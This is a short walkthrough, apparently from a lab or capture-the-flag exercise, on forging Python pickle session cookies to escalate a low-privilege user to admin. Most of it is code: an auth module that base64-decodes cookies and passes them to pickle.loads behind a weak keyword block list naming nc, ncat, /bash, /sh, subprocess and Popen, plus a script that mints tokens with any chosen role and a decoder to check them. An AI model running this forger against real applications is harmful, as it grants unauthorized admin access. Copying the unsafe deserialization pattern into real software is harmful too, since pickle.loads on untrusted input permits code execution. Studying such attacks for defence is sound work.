Here will we see how can we do to perform a Object injection via de-serialization. This type of attack aims to "tamper" part of the functionalties to gain PE.
One good example is to craft our token and elevate from lowpriv user to ADMIN.

1)in the base code the admin role is fetched from DB and checked there:
```
...
    def isAdmin(self):
        return self.role == 'admin'
...


```

2)In our case we want to omit the connection to the SQL that part to be able to create tampered tokens so we must adjust a bit the script to match the following:
```
import pickle
import base64

class Session:
    def __init__(self, username, role):
        self.username = username
        self.role = role

def sessionToCookie(session):
    p = pickle.dumps(session)
    b = base64.b64encode(p)
    return b

def cookieToSession(cookie):
    b = base64.b64decode(cookie)
    for badword in [b"nc", b"ncat", b"/bash", b"/sh", b"subprocess", b"Popen"]:
        if badword in b:
            return None
    p = pickle.loads(b)
    return p 
	
	
```

3)Now we can create our exploit that creates a session with desired role based on the shipped user:
```
import util.auth
import sys

username = sys.argv[1]
role = sys.argv[2] 
s = util.auth.Session(username, role)
c = util.auth.sessionToCookie(s)
print("Serialized token is: ")
print(c.decode())



```

4)We can create a similar decoder to double-check if the shipped:
```
import util.auth
import sys

token = sys.argv[1:]
s = util.auth.cookieToSession(str(token))
print(f"De-serialized Username: ")
print(s.username)
print("De-serialized Role: ")
print(s.role)
```
